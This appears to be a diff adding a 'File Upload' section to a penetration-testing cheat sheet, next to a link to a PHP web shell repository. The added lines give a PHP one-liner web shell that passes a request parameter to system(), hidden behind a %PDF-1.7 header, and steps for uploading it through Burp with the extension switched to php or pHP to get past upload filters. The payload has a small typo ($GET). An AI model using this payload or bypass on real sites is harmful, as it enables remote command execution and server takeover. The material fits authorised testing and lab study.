@@ -18,3 +18,13 @@
 ## PHP webshell
 
 - https://github.com/artyuum/simple-php-web-shell.git
+
+## File Upload
+
+#### PDF file
+
+- cat shell.pdf
+- add this to file:
+  %PDF-1.7
+    <?php echo system($GET['cmd']);?>
+- upload it but capture with Burp and use Burp to change the extension to php/pHP
